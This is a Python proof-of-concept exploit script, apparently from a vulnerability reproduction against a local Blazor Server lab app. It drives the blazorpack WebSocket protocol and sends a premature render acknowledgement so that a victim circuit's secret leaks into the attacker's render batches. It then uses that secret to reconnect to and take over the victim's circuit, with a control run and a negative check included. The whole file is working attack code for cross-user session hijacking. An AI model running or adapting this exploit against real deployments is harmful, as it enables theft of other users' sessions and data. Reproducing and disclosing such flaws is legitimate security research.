import json
import re
import socket
import sys
import time
import urllib.parse
import urllib.request
import websocket
import msgpack

BASE = "http://127.0.0.1:5019"
CONTROL = len(sys.argv) > 1 and sys.argv[1] == "control"
MARKER = re.compile(rb"CIRCUIT-[0-9a-f]{32}")

def http_json(path, data=None):
    req = urllib.request.Request(BASE + path, data=data, method="POST" if data is not None else "GET")
    return json.load(urllib.request.urlopen(req, timeout=5))

def frame(obj):
    packed = msgpack.packb(obj, use_bin_type=True)
    n = len(packed)
    prefix = bytearray()
    while n >= 0x80:
        prefix.append((n & 0x7f) | 0x80)
        n >>= 7
    prefix.append(n)
    return bytes(prefix) + packed

def parse(data):
    out = []
    i = 0
    while i < len(data):
        n = 0
        shift = 0
        while True:
            b = data[i]
            i += 1
            n |= (b & 0x7f) << shift
            shift += 7
            if not b & 0x80:
                break
        out.append(msgpack.unpackb(data[i:i+n], raw=False))
        i += n
    return out

def messages(ws):
    opcode, data = ws.recv_data()
    if opcode == websocket.ABNF.OPCODE_BINARY:
        return parse(data)
    return []

def send(ws, target, args, invocation_id=None):
    ws.send(frame([1, {}, invocation_id, target, args, []]), opcode=websocket.ABNF.OPCODE_BINARY)

def open_circuit(role):
    path = "/probe/" + role
    html = urllib.request.urlopen(BASE + path, timeout=5).read().decode()
    markers = [json.loads(x) for x in re.findall(r"<!--Blazor:(\{.*?\})-->", html)]
    records = json.dumps([x for x in markers if x.get("type") == "server"], separators=(",", ":"))
    assert records != "[]"
    negotiation = http_json("/_blazor/negotiate?negotiateVersion=1", b"")
    token = urllib.parse.quote(negotiation["connectionToken"], safe="")
    ws = websocket.create_connection("ws://127.0.0.1:5019/_blazor?id=" + token, timeout=15,
        sockopt=[(socket.SOL_SOCKET, socket.SO_RCVBUF, 16384)])
    ws.send('{"protocol":"blazorpack","version":2}\x1e', opcode=websocket.ABNF.OPCODE_TEXT)
    assert ws.recv() == b"{}\x1e"
    send(ws, "StartCircuit", [BASE + "/", BASE + path, records, ""], "1")
    initial = None
    completion = False
    completion_secret = None
    for _ in range(12):
        for m in messages(ws):
            if m[0] == 1 and m[3] == "JS.RenderBatch":
                initial = (m[4][0], m[4][1])
            elif m[0] == 3 and m[2] == "1":
                completion = True
                completion_secret = m[4] if len(m) > 4 else None
        if initial and completion:
            break
    assert initial and completion
    marker = MARKER.search(initial[1])
    assert marker
    print(role.upper(), "CONNECTION", negotiation["connectionId"], "INITIAL_ID", initial[0], "INITIAL_BYTES", len(initial[1]), "MARKER_SHA1_8", __import__("hashlib").sha1(marker.group()).hexdigest()[:8], flush=True)
    return ws, negotiation["connectionId"], initial[0], marker.group(), completion_secret

def wait_ids(connection, needed, timeout=8):
    deadline = time.time() + timeout
    latest = None
    while time.time() < deadline:
        rows = http_json("/lab/state")
        latest = next((x["ids"] for x in rows if x["connectionId"] == connection), None)
        if latest and max(latest) >= needed:
            return latest
        time.sleep(.05)
    raise RuntimeError("timed out waiting for batches; latest=" + repr(latest))


attacker, attacker_conn, attacker_initial, attacker_marker, own_secret = open_circuit("attacker-small")
send(attacker, "OnRenderCompleted", [attacker_initial, None])
ids = wait_ids(attacker_conn, attacker_initial + 10)
row = next(x for x in http_json("/lab/state") if x["connectionId"] == attacker_conn)
print("ATTACKER_PENDING_IDS", ids, "SIZES", row["sizes"], flush=True)
assert row["sizes"][0] == 8388608 and all(n == 4096 for n in row["sizes"][1:])
if not CONTROL:
    send(attacker, "OnRenderCompleted", [max(ids), None])
    print("EARLY_ACK_SENT", max(ids), flush=True)
else:
    print("EARLY_ACK_SKIPPED", flush=True)

victim, victim_conn, victim_initial, victim_marker, victim_secret = open_circuit("victim")
assert isinstance(victim_secret, str) and len(victim_secret) > 100
secret_bytes = victim_secret.encode()
print("VICTIM_SECRET_LEN", len(secret_bytes), "SHA256_8", __import__("hashlib").sha256(secret_bytes).hexdigest()[:8], flush=True)

leaked_secret = None
seen = []
attacker.settimeout(25)
for _ in range(30):
    for m in messages(attacker):
        if m[0] == 1 and m[3] == "JS.RenderBatch":
            batch_id, payload = m[4]
            hit = secret_bytes in payload
            seen.append((batch_id, len(payload), hit))
            print("ATTACKER_BATCH", batch_id, "BYTES", len(payload), "VICTIM_SECRET", hit, flush=True)
            if hit:
                offset = payload.index(secret_bytes)
                leaked_secret = payload[offset:offset + len(secret_bytes)].decode()
    if seen and seen[-1][0] >= max(ids):
        break
print("SECRET_WIRE_LEAK", bool(leaked_secret), "SEEN", seen, flush=True)
if CONTROL:
    assert leaked_secret is None
    attacker.close()
    victim.close()
    print("SECRET_CONTROL_PASS", True, flush=True)
    raise SystemExit(0)
if not leaked_secret:
    attacker.close()
    victim.close()
    raise SystemExit(2)
assert leaked_secret == victim_secret

def connect_to_circuit(secret, label):
    negotiation = http_json("/_blazor/negotiate?negotiateVersion=1", b"")
    token = urllib.parse.quote(negotiation["connectionToken"], safe="")
    ws = websocket.create_connection("ws://127.0.0.1:5019/_blazor?id=" + token, timeout=5)
    ws.send('{"protocol":"blazorpack","version":2}\x1e', opcode=websocket.ABNF.OPCODE_TEXT)
    assert ws.recv() == b"{}\x1e"
    send(ws, "ConnectCircuit", [secret], "77")
    result = None
    marker_seen = False
    for _ in range(15):
        for m in messages(ws):
            if m[0] == 3 and m[2] == "77":
                result = m[4] if len(m) > 4 else None
            if m[0] == 1 and m[3] == "JS.RenderBatch":
                marker_seen |= victim_marker in m[4][1]
        if result is not None and (result is False or marker_seen):
            break
    print(label, "CONNECT_RESULT", result, "VICTIM_RENDER", marker_seen, flush=True)
    ws.close()
    return result, marker_seen

denied, denied_marker = connect_to_circuit("invalid-circuit-id", "NEGATIVE")
assert denied is False and not denied_marker
granted, marker_seen = connect_to_circuit(leaked_secret, "LEAKED")
assert granted is True and marker_seen
print("CIRCUIT_TAKEOVER", True, flush=True)
attacker.close()
victim.close()
